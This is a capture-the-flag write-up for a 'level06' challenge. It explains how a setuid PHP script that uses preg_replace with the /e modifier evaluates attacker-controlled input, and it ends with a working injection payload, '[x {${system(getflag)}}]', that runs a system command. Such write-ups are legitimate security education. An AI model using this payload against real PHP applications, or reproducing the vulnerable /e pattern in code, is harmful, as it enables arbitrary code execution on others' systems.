`ls -l` </br>
gives </br>
`-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06`    </br>
`-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php`</br>

`./level06`</br>
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4</br>
level06 seems to be executing level06.php

`./level06.php` </br>
PHP Notice:  Undefined offset: 1 in /home/user/level06/level06.php on line 5</br>
PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5</br>
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4</br>


`./level06 hello` </br>
PHP Warning:  file_get_contents(hello): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4</br>
We seems to need a file as argument.


```php
#!/usr/bin/php
<?php
    function y($m) { 
        $m = preg_replace("/\./", " x ", $m); 
        $m = preg_replace("/@/", " y", $m); 
        return $m; 
    }
    // manipule argv 1
    function x($y, $z) {
        // read file y and put content into string a
        $a = file_get_contents($y); 
        // first / indicates start of regular expression
        // second / indicates end of it, and start of expression flags
        // expression flag here: e , known for security problem
        // The e modifier is a PHP-specific modifier that triggers PHP 
        // to run the resulting string as PHP code.
        // the '/e' modifier actually allows us to evaluate the second argument as a PHP expression.
        // calls the function eval()
        // programms call function y() here thanks to modifier e
        // () Capturing group. Groups multiply tokens together and creates a capture group
        // for extracting a substring or using a backreference
        // \1 - it means the first capturing group in the matched expression. 
        // \n would be the nth capturing group. (Note that \0 would be whole match). 
        // In many engines, the upperlimit for n is 9, but some support up to 99 as well.
        // When used in regex like (a|b)\1, it means that after a or b, the next character 
        // should be the first captured group, which is a or b so the regex here would 
        // match aa or bb.
        // \[ matches a [ character
        // x matches a x character and a space one
        // . matches any character except line breaks
        // * matches 0 or more of the preceding token
        // \] matches a ] character

        // \[x (.*)\] first group --> [x ] or [x coucou] matches
        // .* second group, given as parameter to function y --> [x @.coucou] changes @ and . in y function
        // [x@ @.coucou] don't match first group, so it doesn't work
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
        // replace [ by (
        $a = preg_replace("/\[/", "(", $a);
        // replace ] by )
        $a = preg_replace("/\]/", ")", $a);
        return $a; 
    }
    // y = argv 1
    // z = argv 2
    $r = x($argv[1], $argv[2]); 
    print $r;
?>
```

https://www.yeahhub.com/code-execution-preg_replace-php-function-exploitation/ </br>
https://www.php.net/manual/en/language.types.string.php </br>

So we need to find a syntax matching the regex, so the second group (.* which stands for one or more of any character except line breaks) can be sent to function y, in which the string will be transformed (or not) then returned, so as to be executed by the e modifier.

Struggled **a lot** to find good syntax, tried: </br>
`echo '[x $(getflag)]' > /tmp/flag && ./level06 /tmp/flag` </br>
`echo '[x ${system(getflag)}]' > /tmp/flag && ./level06 /tmp/flag` </br>
and a lot of variants of it. 

To finally come accross the good syntax: `echo '[x {${system(getflag)}}]' > /tmp/flag && ./level06 /tmp/flag`

`echo "This is the value of the var named $name: {${$name}}";`
https://www.php.net/manual/fr/language.types.string.php#language.types.string.parsing.complex
https://www.voidsecurity.in/2012/12/exploit-exercise-php-pregreplace.html </br>
